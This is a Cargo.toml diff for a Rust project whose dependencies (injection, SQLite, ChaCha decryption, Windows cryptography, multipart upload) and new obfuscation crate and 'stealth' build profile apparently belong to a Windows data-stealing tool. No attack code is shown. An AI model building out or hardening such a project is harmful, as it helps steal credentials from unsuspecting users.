@@ -8,11 +8,16 @@ version = "1.0.0"
 edition = "2021"
 build = "build.rs"
 
+[build-dependencies]
+winres = "0.1"
+
 [[bin]]
 name = "jewish"
 path = "src/main.rs"
 
 [dependencies]
+obfstr = "0.4"
+
 inject = { path = "inject" }
 tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
 reqwest = { version = "0.11", default-features = false, features = ["json", "multipart", "rustls-tls"] }
@@ -27,7 +32,7 @@ libloading = "0.8"
 rusqlite = { version = "0.29.0", features = ["bundled"] }
 chacha20poly1305 = "0.10"
 
-[dependencies.windows]
+[target."cfg(windows)".dependencies.windows]
 version = "0.52"
 features = [
     "Win32_Security_Cryptography",
@@ -36,8 +41,21 @@ features = [
 ]
 
 [profile.release]
-opt-level = "s"
-lto = "thin"
-codegen-units = 16
-strip = true
+opt-level = 3
+lto = true
+codegen-units = 1
 panic = "abort"
+strip = "symbols"
+debug = false
+incremental = false
+
+[profile.stealth]
+inherits = "release"
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = "symbols"
+debug = false
+incremental = false
+overflow-checks = false
